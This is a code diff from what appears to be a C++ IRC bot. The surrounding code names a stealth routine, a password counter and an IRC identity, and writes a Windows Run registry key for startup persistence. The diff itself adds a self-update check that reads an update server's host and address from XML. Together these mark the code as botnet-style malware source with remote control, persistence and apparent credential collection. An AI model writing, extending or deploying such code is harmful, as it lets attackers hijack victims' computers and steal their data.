@@ -78,7 +78,7 @@ void Stealth(int x);
 int sec,r,x,found,found2,found3,found4,found5,found6,found7,found8,found9,verb1=6,passwords=0;
 
 std::string total,file2,path,resev,l,cont(""),MESSAGE,HOST,channel,
-IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("Version 1.2"),str=("PRIVMSG ");
+IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("1.2"),str=("PRIVMSG ");
 
 
 char *writable;
@@ -653,7 +653,7 @@ if (RegOpenKey(HKEY_CURRENT_USER,
     TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
     &newValue) != ERROR_SUCCESS)
 {
-    cout<<"Failure in regedit"<<endl;
+    std::cout<<"Failure in regedit"<<std::endl;
     logStartupKey<<LFATAL << "Error:unable to create thread,";
 }
 DWORD pathLenInBytes = pathLen * sizeof(*szPath);
@@ -697,24 +697,34 @@ string encoding = doc.first_node()->first_attribute("encoding")->value();
 // we didn't keep track of our previous traversal, so let's start again
 // we can match nodes by name, skipping the xml declaration entirely
 xml_node<>* cur_node = doc.first_node("current");
-string version = cur_node->first_attribute("version")->value();
+string version_ret = cur_node->first_attribute("version")->value();
 // rootnode_type == "example"
 
 // go straight to the first evendeepernode
-cur_node = cur_node->first_node("childnode")->first_node("evendeepernode");
-string attr2 = cur_node->first_attribute("attr2")->value();
+cur_node = cur_node->first_node("server")->first_node("name");
+string name = cur_node->first_attribute("host")->value();
+string address = cur_node->first_attribute("addr")->value();
 // attr2 == "dog"
 
 // and then to the second evendeepernode
 cur_node = cur_node->next_sibling("evendeepernode");
-attr2 = cur_node->first_attribute("attr2")->value();
 
 
+
+std::string::size_type sz;     // alias of size_t
+double version_retrived = atof (version_ret.c_str());
+double version_local = atof (version.c_str());
+
+if (version_retrived>=version_local)
+    cout<<"Downloading Update"<<endl;
+else
+    cout<<"Version Ok"<<endl;;
 
 
 //cout<< encoding<<endl;
-cout<<"Current Version : "<<version<<endl;
-cout<<attr2<<endl;
+
+cout<<"Updates Server address :"<<name<<address<<endl;
+
 
 return 0;
 }
